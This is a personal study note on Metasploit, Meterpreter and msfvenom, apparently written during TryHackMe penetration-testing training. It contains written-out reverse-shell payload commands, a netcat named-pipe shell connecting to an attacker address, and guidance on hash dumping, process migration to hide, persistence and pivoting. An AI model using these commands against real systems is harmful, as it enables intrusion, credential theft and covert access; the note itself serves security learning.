# Using Metasploit

## Console (“msfconsole”)

Basic Metasploit flow:

* `use $MODULE_NAME`
* `set $OPTIONS`
* `run`

You can use msfconsole as a shell, but there’s no redirect functionality.

### Commands

* `back` — exit the current module
* `db_nmap $FLAGS $IP` — run nmap and dump the results into the Metasploit DB; all nmap $FLAGS are supported and Metasploit will elevate privileges if necessary
* `help` — get metasploit help
* `history` — display command history
* `hosts` — display known hosts in DB
* `hosts -d` — delete saved hosts from DB
* `info` — show module information (including exploit target options)
* `jobs` — check the status of background jobs
* `options` (`advanced`)— show module/exploit options (or “advanced” options)
* `run`/`exploit` — run the selected exploit
* `run -j` — run the selected exploit as a background job
* `search` — search modules; query to a particular type of module using the `type:` parameter (e.g., `search type:exploit wordpress`)
* `services` — display services discovered in known hosts in DB
* `sessions` — list open Meterpreter sessions on a box
* `sessions -i $SESSION_NUMER` — connect to Meterpreter session $SESSION_NUMBER
* `show auxiliary` — show auxiliary modules, filtered by relevancy if called from within a module
* `show exploits` — show exploit modules
* `show options` — show module options
* `show payloads` — show payload modules, filtered by relevancy if called from within a module
* `spool` — save all console output to a log file (useful for record-keeping)
* `use` — select a Metasploit module/exploit
* `vulns` — display vulnerabilities discovered in known hosts in DB
* `workspace` — use workspaces; keeps database results isolated per engagement

Note that you can also call regular shell commands (`ip`, `ls`, etc.) from msfconsole. You can also background processes using Ctrl + Z (Metasploit will trap this, so you don’t have to worry about backgrounding the entire msfconsole).

### Modules

Module categories:

* Auxiliary (odds-n-ends)
* Encoders (re-encode exploits to thwart signature-based anti-malware solutions)
* Evasion (attempt to directly evade anti-malware solutions)
* Exploits
* NOPS (no-op code that can be used to pad exploits to a needed size)
* Payloads (what you want to run if the exploit is successful; often, but not always, some kind of shell)
* Post (additional post-exploitation tools)

Note that Metasploit 6 apparently calls these “framework plugins” now.

* REMEMBER: Open up the port Metasploit’s going to use in your firewall *before* running the exploit. Generally this is port 4444 by default (set with LPORT).
* ALSO REMEMBER: Be sure to set LHOST (and, when applicable, SRVHOST) correctly, even if it’s not indicated by the module. Metasploit’s guesses about which interface to use aren’t always correct… (I find using the explicit IP address works better than specifying the interface device or leaving SRVHOST at the default of 0.0.0.0.)
* ALSO ALSO REMEMBER: Sometimes you might find yourself in the position of trying to exploit a service over an SSH tunnel (for example, if you're trying to exploit a service that's not exposed externally in order to elevate your privileges). When doing this, remember that LHOST is still your machine's external address, as the exploit won't be connecting back over the SSH tunnel (obviously)!

### Module Options

The common RHOSTS option accepts IP addresses, ranges, CIDR networks, and even a file with one target per line (specify as `file:/path/to/file.txt`).

Most modules support the ARCH, PAYLOAD, and SESSION options (for specifying target architecture, the payload to deliver, or session number to connect to). However, these are *not* shown when running `show options`.

You can reset individual parameters using `unset`, and reset the entire module using `unset all`.

Equivalent module commands:

* `set -g` = `setg`
* `unset -g` = `unsetg`
* `run` = `exploit`

Some exploit modules have a `check` option which attempts to determine if a target is vulnerable without actually exploiting it. Alternately, other modules have a paired auxiliary scanner. Many *don’t* have a check at all. YMMV!

### Scanners

Use `search portscan` to display built-in Metasploit port scanners. Note that `msfconsole` needs to be run as root for many scans to work — just like Nmap. That said, in my experience the fancier TCP scans (for example, SYN) don’t work over a VPN… So maybe best to stick with Nmap.

Targeted scanners can be more useful, however:

* The `auxiliary/scanner/discovery/udp_sweep` module will probe for common UDP services.
* The `auxiliary/scanner/http/http_version` module will give you HTTP server version information.
* The `auxiliary/scanner/smb/smb_login` module will allow you to bruteforce Samba logins (username and/or password) using a wordlist(s).

Metasploit has a variety of Samba/CIFS scanners too (use `search scanner/smb` to list them), as well as modules for basic enumeration such as `smtp_version`/`smtp_enum` (for SMTP) and `mysql_sql` (for MySQL, though this seems to just be a thin wrapper around the MySQL command line client).

### Payloads

Payloads can be divided into:

* Singles (self-contained; also indicated by the use of an `_` separating “shell” from the rest of the payload name, as in `shell_reverse_tcp`)
* Stagers (small applications that establish a connection back to the attacker to download a larger, more complex payload)
* Stages (payloads designed to be downloaded by a stager; also indicated by the use of a `/` separating “shell” from the rest of the payload name, as in `shell/reverse_tcp`)

Payloads follow the OS/ARCHITECTURE/PAYLOAD (though ARCHITECTURE is not included for 32-bit Windows payloads).

NOTE: Metasploit defaults to sending 32-bit payloads, but an increasing number of things won't work on a 64-bit system from a 32-bit meterpreter shell. It's probably best to explicitly set the `payload` option to use a 64-bit payload unless you *know* that you'll be dealing with a 32-bit system.

List all available payloads using `msfvenom --list payloads` or `show payloads` from within the Metasploit console.

A specific payload can be set in the Metasploit console use the `set PAYLOAD full/path/to/payload`.

If you initially get a native shell, use the `post/multi/manage/shell_to_meterpreter` module to upgrade to Meterpeter. (NOTE: shell_to_meterpreter creates a new connection on a new port, by default 4433.)

## Meterpreter

The Meterpreter reverse shell *requires* a connection back to msfconsole using multi/handler.

### Commands

* `background` — background the current Meterpreter session and return to the Metasploit console
* `cat` — dump file contents
* `creds_all` — dump all user credentials in memory (requires the `kiwi` module)
* `download` — transfer file from the target to the host
* `execute` — execute a host command
* `getprivs` — display current user privileges
* `getuid` — display current user ID
* `getsystem` — attempt to elevate to (or confirm) local system privileges
* `golden_ticket_create` — create a golden ticket (requires the `kiwi` module)
* `hashdump` — dump NTLM hashes from the SAM (Windows-only, requires system privileges); fields are username, RID (the last four digits of the Windows SID, with leading zeros dropped), LM password hash, NTLM password hash
* `help` — help menu
* `help $COMMAND` — help specifically for $COMMAND
* `ipconfig`/`ifconfig` — display network information
* `load kiwi` — load (newer) Mimikatz module
* `migrate` — migrate Meterpreter into a different process
* `ps` — process list
* `record_mic` — record using the system’s microphone
* `run` — run a Metsploit module (see below)
* `search` — search files (like “find”)
* `screenshare` — view the current user’s desktop in realtime
* `shell` — drop to system shell as the current user
* `sysinfo` — display system information
* `timestomp` — manipulate file times
* `upload` — transfer file from the host to the target

Meterpreter sessions can be backgrounded using the `background` command, and all sessions can be backgrounded using `CTRL + Z`. List sessions using the `sessions` command, and foreground a session using `session -i #`, where `#` is the session number.

I *think* that Meterpreter is being run directly from memory, and what `migrate` is doing is basically creating a new process using the memory of a different application, hopping to that process, and then shutting down the old process.

Reasons to migrate the Meterpreter process:

* For persistence (pick a long-running process)
* To make sure that the Meterpreter *process* has system privileges
* To hide (pick a process less likely to be examined)
* To stabilize the shell (initial exploits often produce somewhat unstable sessions)
* To move laterally or escalate privileges within a system (if you’re lucky)

In particular, harvesting credentials from LSASS requires that Meterpreter be living in a process with the same permissions (NT AUTHORITY/SYSTEM) and architecture as LSASS; migrating Meterpreter can help us realize this. The print spooler service (`spoolsv.exe`) is often a good choice, as it runs with elevated permissions, has the same architecture as the system itself, and will restart itself automatically.

### Modules

Potentially useful Metsploit modules to `run` from/besides Meterpreter:

* `post/windows/gather/checkvm` — try to determine if we’re in a VM
* `post/multi/recon/local_exploit_suggester` — find possible privilege escalation exploits (can be slow/unreliably on 64-bit architectures)
* `post/windows/gather/hashdump` — same as the hashdump command, but pushes the hashes into the Metasploit DB
* `auxiliary/analyze/crack_windows` — sic John the Ripper or Hashcat on NTLM hashes stored in the Metasploit DB
* `post/windows/manage/enable_rdp` — enable RDP access (requires admin privileges)
* `post/multi/manage/autoroute` — manipulate target routing for pivoting
* `auxiliary/server/socks_proxy` — start a SOCKS proxy
* `exploit/windows/local/persistence` — sets up a persistent connection (you probably want to `set STARTUP SYSTEM`)… *without a password!*

NOTE: It is generally more useful to background Meterpreter and then run these commands through the Metasploit console, as within Meterpreter they need to have all options specified on the “run” command line (in the console you can access help, actually *see* what the options are, etc.).

There seem to be a lot of options for the `post/multi/manage/autoroute` and `auxiliary/server/socks_proxy` modules, but I don’t see a way to access them from Meterpreter (it looks like to get help you need to background Meterpreter and use the console).

The advantage of setting up a SOCKS proxy on the target is that you can then use proxychains to route through the target; this can allow you to pivot more deeply into the network that you’re attacking. (You probably want to create a custom proxychains.conf file to do this. Fortunately, /etc/proxychains.conf is well documented.)

### Loading PowerShell

```meterpreter
load powershell
powershell_shell
```

*Don’t* try to exit PowerShell — trying to do this produces consistent hangs for me. Instead, background the process with `^Z`.

## Venom (“msfvenom”)

Msfvenom is a tool to create custom versions of Metasploit payloads, encoded into a variety of different binary formats and scripts. For example:

```bash
# Use Metasploit to generate the code for a remote shell:
# 
msfvenom -p cmd/unix/reverse_netcat \
            lhost=$LOCAL_IP lport=$LOCAL_PORT

# Spin up a listener using netcat:
#
nc -lvp $LOCAL_PORT
```

This will generates code that looks like this:

```bash
mkfifo /tmp/qdsrgu; \
nc $LOCAL_IP $LOCAL_PORT 0</tmp/qdsrgu | \
	/bin/sh >/tmp/qdsrgu 2>&1; \
rm /tmp/qdsrgu
```

What’s going on here?

* `mkfifo /tmp/qdsrgu` creates a named pipe at /tmp/qdsrgu.
* We then spin up a netcat instance directed at our local machine (`nc $LOCAL_IP $LOCAL_PORT`), direct the contents of the pipe into netcat’s STDIN (`0< /tmp/qdsrgu`), pipe the *output* of netcat to a shell we know probably exists (`| /bin/sh`), and finally redirect *both* STDOUT and STDERR back into the named pipe (`> /tmp/qdsrgu 2>&1`).
* On the local machine, `nc -lvp $LOCAL_PORT` listens for the incoming netcat connection from the remote. Anything we type on STDIN here gets sent to the remote and piped to /bin/sh *there*. The output of /bin/sh is then sent to the named pipe, which dumps into (the remote) netcat, which then sends the data to the local machine where it ends up on STDOUT.

Use `--list formats` to see available encoding formats.

```bash
# 32-bit Linux ELF Meterpreter payload
#
msfvenom -p linux/x86/meterpreter/reverse_tcp \
LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f elf > rev_shell

# 32-bit Windows executable Meterpreter payload
#
msfvenom -p windows/meterpreter/reverse_tcp \
LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f exe > rev_shell.exe

# PHP Meterpreter payload
#
msfvenom -p php/meterpreter_reverse_tcp \
LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f raw > rev_shell.php

# ASP Meterpreter payload
#
msfvenom -p windows/meterpreter/reverse_tcp \
LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f asp > rev_shell.asp

# Python Meterpreter payload
#
msfvenom -p cmd/unix/reverse_python \
LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f raw > rev_shell.py
```

### 32-Bit Windows Programs

By default, msfvenom produces 64-bit executables when using the `-f exe`. This doesn’t work, however, if you’re trying to replace a program in Program Files (x86). In this case, you’ll need to explicitly instruct msfvenom to encode a 32-bit binary using  `-e x86/shikata_ga_nai`.

### Catching Shells

Use the `exploit/multi/handler` module in Metasploit to catch the shells produced using Msfvenom (note that you’ll need to use `set payload` to tell Metasploit *what* it’s catching!). We can catch both regular reverse shells and Meterpreter sessions this way.

## References

* [TryHackMe: Complete Beginner](tryhackme-complete-beginner.md)
* [How does process migration work in Meterpreter](https://security.stackexchange.com/a/92893)
* [Metasploit Documentation: Scanning and Managing Hosts](https://docs.rapid7.com/metasploit/scanning-and-managing-hosts/)
* [Metasploit Basics, Part 8: Exploitation with EternalBlue](https://www.hackers-arise.com/post/2017/06/12/metasploit-basics-part-8-exploitation-with-eternalblue)
* [Shell to Meterpreter Upgrade](https://www.infosecmatter.com/metasploit-module-library/?mm=post/multi/manage/shell_to_meterpreter)
* [TryHackMe: CC: Pen Testing](tryhackme-cc-pen-testing.md)
* [Ice](tryhackme-ice.md)
* [How do you send a 64 bit meterpreter stager?](https://security.stackexchange.com/a/83410)
* [Blaster](tryhackme-blaster.md)
* [Multiple Ways to Persistence on Windows 10 with Metasploit](https://www.hackingarticles.in/multiple-ways-to-persistence-on-windows-10-with-metasploit/)
* [Metasploit - Payload](https://www.tutorialspoint.com/metasploit/metasploit_payload.htm)
* [TryHackMe: Game Zone](tryhackme-game-zone.md)
* [Using “nmap”](nmap.md)
* [Return-orientated programming (Wikipedia)](https://en.wikipedia.org/wiki/Return-oriented_programming)
* [Kerberos](kerberos.md)
* [Using John the Ripper](john-the-ripper.md)
* [Using Hashcat](hashcat.md)
* [2022-04-13 ITPro.TV: CompTIA Security+ (SY0-601) & TryHackMe: Jr. Penetration Tester](../log/2022-04-13-itprotv-comptia-security-plus-and-tryhackme-jr-penetration-tester.md)
* [Dumping Windows Password Hashes Using Metasploit](https://www.utc.edu/sites/default/files/2021-04/4660-lab6.pdf)
* [Windows Password Hashes](../notes/windows-password-hashes.md)
* [2022-04-14 TryHackMe: Jr. Penetration Tester](../log/2022-04-14-tryhackme-jr-penetration-tester.md)

- - - -

<span aria-hidden="true">👤</span> Nathan Acks  
<span aria-hidden="true">📅</span> April 16, 2022
